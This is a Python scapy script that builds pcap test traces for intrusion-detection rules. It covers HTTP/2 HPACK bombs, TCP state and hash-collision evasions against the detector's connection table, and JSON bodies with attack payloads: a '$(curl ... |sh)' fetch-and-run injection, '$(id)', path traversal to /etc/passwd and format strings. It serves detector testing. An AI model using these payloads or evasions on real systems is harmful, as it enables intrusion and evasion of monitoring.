"""Crafted traces for the review fixes of rules 33, 71, 97 and 98 (fork PR #12 review).

Usage: python3 gen_review.py OUTDIR

Each TCP connection is written packet by packet, so that the initial sequence
numbers and the order of the segments of interleaved connections are chosen.
HPACK is encoded by hand (RFC 7541), without Huffman coding.
"""
import struct
import sys
from scapy.all import Ether, IP, TCP, Raw, wrpcap

out = sys.argv[1]
CLI, SRV = "10.0.0.1", "10.0.0.2"
PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"


def frame(ftype, flags, sid, payload):
    return struct.pack(">I", len(payload))[1:] + bytes([ftype, flags]) + struct.pack(">I", sid) + payload


def settings(*params):
    return frame(4, 0, 0, b"".join(struct.pack(">HI", i, v) for i, v in params))


SETTINGS_ACK = frame(4, 1, 0, b"")
# :method GET, :scheme http, :path /, :authority lab, content-type application/json
REQ = b"\x83\x86\x84\x01\x03lab\x0f\x10\x10application/json"
RESP = b"\x88"  # :status 200


def old_slot(src, dst, sport, dport):
    """The slot of a connection direction in the rules 97/98 of fork PR #12:
    FNV-1a of the 4-tuple, without seed, modulo 256. The evasions choose their
    ports with it."""
    k = bytes(map(int, src.split("."))) + bytes(map(int, dst.split("."))) + \
        bytes([sport >> 8, sport & 255, dport >> 8, dport & 255])
    h = 2166136261
    for b in k:
        h = ((h ^ b) * 16777619) & 0xffffffff
    return h % 256


class Pcap:
    def __init__(self, t0):
        self.pkts, self.t = [], t0

    def add(self, p):
        self.t += 0.001
        p.time = self.t
        self.pkts.append(p)

    def write(self, name):
        wrpcap("%s/%s.pcap" % (out, name), self.pkts)


class Conn:
    """One TCP connection; cl() and sv() send data from the client and the server."""

    def __init__(self, cap, sport, dport=8080, isn_c=1000, isn_s=5000):
        self.cap, self.sp, self.dp, self.c, self.s = cap, sport, dport, isn_c, isn_s

    def _c(self, flags, data=b""):
        p = Ether(src="02:00:00:00:00:01", dst="02:00:00:00:00:02") / IP(src=CLI, dst=SRV) / \
            TCP(sport=self.sp, dport=self.dp, flags=flags, seq=self.c, ack=self.s)
        self.cap.add(p / Raw(data) if data else p)

    def _s(self, flags, data=b""):
        p = Ether(src="02:00:00:00:00:02", dst="02:00:00:00:00:01") / IP(src=SRV, dst=CLI) / \
            TCP(sport=self.dp, dport=self.sp, flags=flags, seq=self.s, ack=self.c)
        self.cap.add(p / Raw(data) if data else p)

    def handshake(self):
        self.c -= 1
        self.s -= 1
        self._c("S")
        self.c += 1
        self._s("SA")
        self.s += 1
        self._c("A")

    def cl(self, data, mss=1448):
        for i in range(0, len(data), mss):
            ch = data[i:i + mss]
            self._c("PA", ch)
            self.c = (self.c + len(ch)) & 0xffffffff

    def seg(self, data, seq):
        """one client segment at sequence number #seq; the next sequence number does not change"""
        c, self.c = self.c, seq & 0xffffffff
        self._c("PA", data)
        self.c = c

    def sv(self, data):
        self._s("PA", data)
        self.s = (self.s + len(data)) & 0xffffffff

    def h2_setup(self, server_settings=()):
        self.handshake()
        self.cl(PREFACE + settings())
        self.sv(settings(*server_settings) + SETTINGS_ACK)
        self.cl(SETTINGS_ACK)

    def http1(self, exchanges):
        self.handshake()
        for d, data in exchanges:
            (self.cl if d == "c" else self.sv)(data)
        self.fin()

    def fin(self):
        self._c("FA")
        self.c += 1
        self._s("FA")
        self.s += 1
        self._c("A")


def h2_set(seed, sport, dport=8080, sets=32):
    """The set of a connection CLI:sport - SRV:dport in the table of rules 97/98
    when MMT_SEC_HTTP2_SEED=seed: seeded FNV-1a of the key (the lower endpoint
    first), then the MurmurHash3 finaliser, modulo the number of sets."""
    m = (1 << 64) - 1
    a = bytes(map(int, CLI.split("."))) + struct.pack(">H", sport)
    b = bytes(map(int, SRV.split("."))) + struct.pack(">H", dport)
    h = 14695981039346656037 ^ seed
    for x in min(a, b) + max(a, b):
        h = ((h ^ x) * 1099511628211) & m
    h ^= h >> 33
    h = (h * 0xff51afd7ed558ccd) & m
    h ^= h >> 33
    h = (h * 0xc4ceb9fe1a85ec53) & m
    h ^= h >> 33
    return h % sets


def bomb(conn, first=b"", between=None, blocks=50):
    """HPACK bomb: a 3000-byte header inserted in the dynamic table (index 62),
    then 50 blocks of 204 bytes that reference it 200 times each.
    between(conn), if set, is called after the priming block."""
    value = b"A" * 3000
    prime = first + b"\x40\x0bx-bomb-name\x7f" + bytes([((3000 - 127) & 0x7f) | 0x80, (3000 - 127) >> 7]) + value
    conn.cl(frame(1, 4, 1, REQ + prime))
    conn.sv(frame(1, 5, 1, RESP))
    if between:
        between(conn)
    sid = 3
    for _ in range(blocks):
        conn.cl(frame(1, 5, sid, REQ + b"\xbe" * 200))
        conn.sv(frame(1, 5, sid, RESP))
        sid += 2


def json_request(conn, body, sid=1):
    conn.cl(frame(1, 4, sid, REQ) + frame(0, 1, sid, body))
    conn.sv(frame(1, 5, sid, RESP))


# ------------------------------------------------- 97: state evasions (finding 1)
c = Pcap(1700030000.0)
# both directions of the connection in the same slot of the old table
port = next(p for p in range(40000, 65000) if old_slot(CLI, SRV, p, 8080) == old_slot(SRV, CLI, 8080, p))
a = Conn(c, port)
a.h2_setup()
bomb(a)
a.fin()
# 4-tuple reused, the new connection's ISN behind the old one's next sequence number
a = Conn(c, 50001, isn_c=2000000)
a.h2_setup()
a.cl(frame(1, 5, 1, REQ))
a.sv(frame(1, 5, 1, RESP))
a.fin()
a = Conn(c, 50001, isn_c=1000, isn_s=7000)
a.h2_setup()
bomb(a)
a.fin()


def preface_in_data(conn, sid=1):
    """a DATA frame whose last 24 bytes, in a segment of their own, are the
    connection preface: data of the stream at the expected sequence number,
    which the server reads as DATA payload, not a new connection"""
    d = frame(0, 1, sid, b"x" * 20 + PREFACE)
    conn.cl(d[:-24])
    conn.cl(d[-24:])


def far_behind(conn):
    """a segment 2 MiB behind the next sequence number: out of the window, the
    server drops it"""
    conn.seg(frame(6, 0, 0, b"\0" * 8), conn.c - (2 << 20))


def far_ahead(conn):
    """a segment 2 MiB ahead of the next sequence number: out of the window"""
    conn.seg(frame(6, 0, 0, b"\0" * 8), conn.c + (2 << 20))


# in the cases below, 10 bombs (10 alerts) instead of 50, to keep the capture small
# the preface at the expected sequence number, between the priming block and the bombs (review 2, F2 a)
a = Conn(c, 50002)
a.h2_setup()
bomb(a, between=preface_in_data, blocks=10)
a.fin()
# a segment 2 MiB behind, between the priming block and the bombs (review 2, F2 b)
a = Conn(c, 50003)
a.h2_setup()
bomb(a, between=far_behind, blocks=10)
a.fin()
# 4-tuple reused, the new connection's ISN 64 KiB behind the old one's next
# sequence number: only the preface tells the new connection
a = Conn(c, 50004, isn_c=1000 + (64 << 10))
a.h2_setup()
a.cl(frame(1, 5, 1, REQ))
a.sv(frame(1, 5, 1, RESP))
a.fin()
a = Conn(c, 50004, isn_c=1000, isn_s=7000)
a.h2_setup()
bomb(a, blocks=10)
a.fin()
c.write("97.http2_state_evasion")

# ------------------------------------------------- 98: state evasions (finding 1)
FUZZ = b'{"cmd":"$(id)"}'
c = Pcap(1700031000.0)
# a colliding connection sends one segment between the HEADERS and the DATA
pa = 46000
pb = next(p for p in range(47000, 65000) if old_slot(CLI, SRV, p, 8080) == old_slot(CLI, SRV, pa, 8080))
a, b = Conn(c, pa), Conn(c, pb)
b.h2_setup()
a.h2_setup()
a.cl(frame(1, 4, 1, REQ))
b.cl(frame(6, 0, 0, b"\0" * 8))   # PING
a.cl(frame(0, 1, 1, FUZZ))
a.sv(frame(1, 5, 1, RESP))
a.fin()
b.fin()
# 4-tuple reused, the new connection's ISN behind the old one's next sequence number
a = Conn(c, 50000, isn_c=2000000)
a.h2_setup()
a.cl(frame(1, 5, 1, REQ))
a.sv(frame(1, 5, 1, RESP))
a.fin()
a = Conn(c, 50000, isn_c=1000, isn_s=7000)
a.h2_setup()
json_request(a, FUZZ)
a.fin()
# a segment between the HEADERS and the DATA (review 2, F2):
# - a DATA frame of stream 3 that ends with the preface at the expected sequence number;
# - a segment 2 MiB behind (out of the window);
# - a segment 2 MiB ahead (out of the window): the next segments are far behind
#   it, so the reader restarts on them
for i, between in enumerate([lambda a: (a.cl(frame(1, 4, 3, REQ)), preface_in_data(a, 3)), far_behind, far_ahead]):
    a = Conn(c, 50010 + i)
    a.h2_setup()
    a.cl(frame(1, 4, 1, REQ))
    between(a)
    a.cl(frame(0, 1, 1, FUZZ))
    a.sv(frame(1, 5, 1, RESP))
    a.fin()
# 4-tuple reused, the new connection's ISN 64 KiB behind the old one's next sequence number
a = Conn(c, 50020, isn_c=1000 + (64 << 10))
a.h2_setup()
a.cl(frame(1, 5, 1, REQ))
a.sv(frame(1, 5, 1, RESP))
a.fin()
a = Conn(c, 50020, isn_c=1000, isn_s=7000)
a.h2_setup()
json_request(a, FUZZ)
a.fin()
c.write("98.http2_state_evasion")

# ------------------------------------------------- 97, 98: connection table (review 2, F3)
# Run with MMT_SEC_HTTP2_SEED=1 (check/pcap/97.98.http2_conn_table.env): the
# connections of a case all fall in one set of the table (4 ways, LRU).
SEED = 1
c = Pcap(1700036000.0)
ports = iter(range(30000, 65000))
used_sets = []


def same_set(n):
    """n client ports whose connections fall in one set, a set no other case uses"""
    while True:
        p = next(ports)
        s = h2_set(SEED, p)
        if s in used_sets:
            continue
        used_sets.append(s)
        found = [p]
        while len(found) < n:
            q = next(ports)
            if h2_set(SEED, q) == s:
                found.append(q)
        return found


def other(port):
    o = Conn(c, port)
    o.h2_setup()
    o.fin()


# 97: A primes its table, other connections of the set come, then A sends 5 bombs
#   - B, C, D: A is one of the 4 connections of the set: 5 alerts
#   - B, C, D, E: A is the least recently used one, E replaces it: no alert
#   - B, C, A (PING), D, E: B is the least recently used one when E comes: 5 alerts
for plan in ["BCD", "BCDE", "BCADE"]:
    pa, *po = same_set(1 + len(set(plan) - {"A"}))
    a = Conn(c, pa)
    a.h2_setup()
    a.cl(frame(1, 5, 1, REQ + b"\x40\x0bx-bomb-name\x7f" + bytes([((3000 - 127) & 0x7f) | 0x80, (3000 - 127) >> 7]) + b"A" * 3000))
    a.sv(frame(1, 5, 1, RESP))
    po = iter(po)
    for step in plan:
        if step == "A":
            a.cl(frame(6, 0, 0, b"\0" * 8))
        else:
            other(next(po))
    for sid in range(3, 13, 2):
        a.cl(frame(1, 5, sid, REQ + b"\xbe" * 200))
        a.sv(frame(1, 5, sid, RESP))
    a.fin()
# 98: A sends the HEADERS of a request, other connections come, then A sends
# the fuzzed body: A's state (it is the client) must still be known
#   - B, C, D: 1 alert;  B, C, D, E: no alert;  B, C, A (PING), D, E: 1 alert
for plan in ["BCD", "BCDE", "BCADE"]:
    pa, *po = same_set(1 + len(set(plan) - {"A"}))
    a = Conn(c, pa)
    a.h2_setup()
    a.cl(frame(1, 4, 1, REQ))
    po = iter(po)
    for step in plan:
        if step == "A":
            a.cl(frame(6, 0, 0, b"\0" * 8))
        else:
            other(next(po))
    a.cl(frame(0, 1, 1, FUZZ))
    a.sv(frame(1, 5, 1, RESP))
    a.fin()
c.write("97.98.http2_conn_table")

# ------------------------------------------------- 97: header table size 0 (finding 3)
c = Pcap(1700032000.0)
# the server sets SETTINGS_HEADER_TABLE_SIZE to 0: its decoder keeps no entry,
# the references to index 62 cannot be decoded: no bomb
a = Conn(c, 45100)
a.h2_setup(server_settings=[(1, 0)])
bomb(a)
a.fin()
# the client sets its table size to 0 (dynamic table size update) before inserting
a = Conn(c, 45101)
a.h2_setup()
bomb(a, first=b"\x20")
a.fin()
# control: SETTINGS_HEADER_TABLE_SIZE 8192: a bomb
a = Conn(c, 45102)
a.h2_setup(server_settings=[(1, 8192)])
bomb(a)
a.fin()
c.write("97.http2_hpack_table_size_zero")

# ------------------------------------------------- 98: benign JSON bodies (finding 2)
c = Pcap(1700033000.0)
benign = [
    b'{"comment":"Use `git status` to check","id":1}',            # markdown code
    b'{"href":"../images/logo.png","alt":"logo"}',                # one level up
    b'{"next":"https://x/a?b%3d1%2dc%3d2"}',                      # lower-case URL escapes
    b'{"desc":"100%natural cotton"}',                             # "%n" followed by a letter
    b'{"code":"$(document).ready(fn)","h":"$(\\"#id\\").hide()"}',  # jQuery
    b'{"index":{"_id":"1"}}\n{"field":"value"}\n',                # NDJSON
    b'{"fmt":"%s has %d items"}',                                 # printf documentation
    b"[" * 70 + b"]" * 70,                                        # valid JSON, 70 deep
    b'{"a":1}',
    '{"name":"Zoë – café"}'.encode(),                             # UTF-8
]
attacks = [
    b'{"cmd":"`id`"}',                                            # backticks: whole value
    b'{"q":"x;`id`"}',                                            # backticks after ';'
    b'{"p":"../../../etc/passwd"}',                               # traversal
    b'{"p":"..%2f..%2fetc%2fpasswd"}',                            # encoded traversal
    b'{"f":"%x.%x.%x.%x"}',                                       # format string
    b'{"f":"%p %p %p"}',                                          # format string
    b'{"f":"AAAA%n"}',                                            # "%n"
    b'{"c":"$(curl -s http://203.0.113.9/x|sh)"}',                # command substitution
    b'{"a":1}{"b":2}',                                            # 2 JSON texts on one line
    b"[" * 70 + b"]" * 69,                                        # unbalanced
    # format strings with a width (review 2, F1): not URL escapes
    b'{"q":"%08x%08x%08x%08x"}',
    b'{"q":"AAAA%08x.%08x.%08x.%08x"}',
    b'{"q":"%10x%10x%10x"}',
    b'{"q":"%20s%20s"}',
    b'{"q":"AAAA%10n"}',
    b'{"f":"$(whoami).log"}',                                     # not jQuery (review 2, F6)
]
for i, body in enumerate(benign + attacks):
    a = Conn(c, 48000 + i)
    a.h2_setup()
    json_request(a, body)
    a.fin()
c.write("98.http2_fuzzing_benign_json")

# ------------------------------------------------- 71: body continuation segments (finding 5)
c = Pcap(1700034000.0)
GET = b"GET / HTTP/1.1\r\nHost: lab.example\r\nAccept: */*\r\n\r\n"
HDR = b"HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: 200\r\n\r\n"
cases = [
    # benign: a later segment of a body starts with a line ending in HTTP/x
    [("c", GET), ("s", HDR), ("s", b"we now speak HTTP/2\r\nand more text follows here\r\n")],
    [("c", GET), ("s", HDR), ("s", b"SEE ALSO HTTP/2\r\nand more text follows here\r\n")],
    [("c", GET), ("s", HDR), ("s", b"HTTP/2 is faster than HTTP/1.1\r\nmore text\r\n")],
    # benign start lines
    [("c", GET), ("s", b"HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\n\r\n")],
    [("c", GET), ("s", b"HTTP/1.1 204\r\n\r\n")],
    # malicious versions
    [("c", b"GET /index.html HTTP/1.01\r\nHost: lab.example\r\n\r\n")],
    [("c", b"OPTIONS * HTTP/1.2\r\nHost: lab.example\r\n\r\n")],
    [("c", b"CONNECT lab.example:443 HTTP/1.3\r\nHost: lab.example:443\r\n\r\n")],
    [("c", b"GET http://lab.example/ HTTP/0.8\r\nHost: lab.example\r\n\r\n")],
    [("c", GET), ("s", b"HTTP/1.2 200 OK\r\nContent-Length: 0\r\n\r\n")],
    # runs of SP between the tokens (review 2, F5): a benign request, then malicious versions
    [("c", b"GET  /  HTTP/1.1\r\nHost: lab.example\r\n\r\n"), ("s", b"HTTP/1.1  200 OK\r\nContent-Length: 0\r\n\r\n")],
    [("c", b"GET  / HTTP/1.2\r\nHost: lab.example\r\n\r\n")],
    [("c", GET), ("s", b"HTTP/1.01  200 OK\r\nContent-Length: 0\r\n\r\n")],
]
for i, ex in enumerate(cases):
    Conn(c, 41100 + i, 80).http1(ex)
c.write("71.http_body_continuation")

# ------------------------------------------------- 33: generic entries removed (finding 7)
c = Pcap(1700035000.0)
uris = [
    # benign URIs that contained a removed generic entry
    "/forum.php?sid=8a7f", "/images/view.php?id=4", "/config.php?id=2", "/load.php?file=main.js",
    "/ad/click?sid=1&cid=2", "/api?user=bob&type=json&id=3", "/upload/img.jpg", "/check_value.php",
    "/set/first.html", "/connect.php?a=1",
    # still detected
    "/install/ws.exe", "/gate.php?hash=8f2a0c1d",
]
for i, u in enumerate(uris):
    req = b"GET " + u.encode() + b" HTTP/1.1\r\nHost: lab.example\r\nUser-Agent: curl/8.5.0\r\nAccept: */*\r\n\r\n"
    Conn(c, 42100 + i, 80).http1([("c", req), ("s", b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n")])
c.write("33.trojan_generic_uris_benign")
print("ok")
